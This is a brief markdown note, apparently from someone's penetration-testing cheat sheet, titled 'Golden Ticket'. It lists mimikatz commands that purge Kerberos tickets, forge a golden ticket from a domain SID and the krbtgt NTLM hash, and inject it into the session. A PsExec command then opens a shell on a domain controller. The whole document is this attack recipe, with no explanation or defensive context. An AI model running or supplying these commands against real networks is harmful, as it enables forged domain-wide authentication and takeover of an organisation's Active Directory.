# Golden Ticket

```
# In mimikatz
kerberos::purge

kerberos::golden /user:<current domain user> /domain:corp.com /sid:<domain SID> /krbtgt:<krbtgt ntlm hash> /ptt

misc::cmd

# In cmd
PsExec.exe \\DC1 cmd.exe
```